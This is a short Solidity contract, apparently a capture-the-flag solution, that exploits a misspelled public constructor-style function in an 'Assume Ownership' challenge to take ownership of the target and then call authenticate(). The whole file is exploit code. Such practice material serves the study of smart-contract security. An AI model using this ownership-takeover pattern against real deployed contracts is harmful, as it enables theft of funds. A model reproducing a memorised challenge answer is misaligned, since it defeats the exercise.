pragma solidity 0.8.7;

interface IAssumeOwnershipChallenge {
    function AssumeOwmershipChallenge() external;
    function authenticate() external;
}

contract AssumeOwnershipChallengeHack {
    IAssumeOwnershipChallenge public aocInstance;

    constructor (IAssumeOwnershipChallenge _aocInstance) {
        aocInstance = _aocInstance;
    }

    function attack() public {
        aocInstance.AssumeOwmershipChallenge();
        aocInstance.authenticate();
    }
}